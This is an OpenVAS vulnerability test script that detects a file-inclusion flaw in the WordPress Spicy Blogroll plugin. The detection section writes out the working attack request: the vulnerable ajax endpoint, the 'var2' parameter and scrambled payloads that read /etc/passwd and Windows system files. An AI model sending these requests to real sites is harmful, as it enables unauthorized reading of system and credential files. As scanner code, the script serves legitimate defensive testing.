###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wp_spicy_blogroll_file_incl_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Wordpress Spicy Blogroll Plugin File Inclusion Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "
  Impact Level: Application";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803843";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-07-26 16:57:57 +0530 (Fri, 26 Jul 2013)");
  script_name("Wordpress Spicy Blogroll Plugin File Inclusion Vulnerability");

  tag_summary =
"This host is running Wordpress Spicy Blogroll Plugin and prone to file
inclusion vulnerability.";

  tag_vuldetect =
"Send a scrambled file name via HTTP GET request and check whether it is able
to read the system file or not.";

  tag_insight =
"Input passed via 'var2' and 'var4' parameters to
'/spicy-blogroll/spicy-blogroll-ajax.php' script is not properly sanitised
before being used in the code.";

  tag_impact =
"Successful exploitation will allow attacker to bypass certain security
restrictions and gain access to file system and other configuration files.";

  tag_affected =
"Wordpress Spicy Blogroll Plugin version 1.0.0 and prior";

  tag_solution =
"No solution or patch is available as of 30th July, 2013. Information
regarding this issue will be updated once the solution details are available.
For updates refer to http://wordpress.org/plugins/spicy-blogroll";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://1337day.com/exploits/20994");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/26804");
  script_xref(name : "URL" , value : "http://cxsecurity.com/issue/WLB-2013070111");
  script_summary("Determine if is is possible to read a local file");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
port = 0;
dir = "";
url = "";

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port)){
  exit(0);
}

## Scrambled file names ( /etc/passwd, /boot.ini, /winnt/win.ini, /windows/win.ini )
## spicy-blogroll-ajax.php will unscramble those file names.
foreach file (make_list("CG-grec-r_uqjyb", "CG-dmqmr0gpgc",
            "CG-ygpulv-ygap,klkk", "CG-ygpxbquu-tygp,kalk"))
{
  ## Construct the attack request
  url = dir + '/wp-content/plugins/spicy-blogroll/spicy-blogroll-ajax.php?var2='+file;

  ## Send Request and Receive Response
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  if("[boot loader]" >< res || "; for 16-bit app support" >< res ||
                 egrep(pattern:".*root:.*:0:[01]:.*", string:res))
  {
    security_hole(port:port);
    exit(0);
  }
}
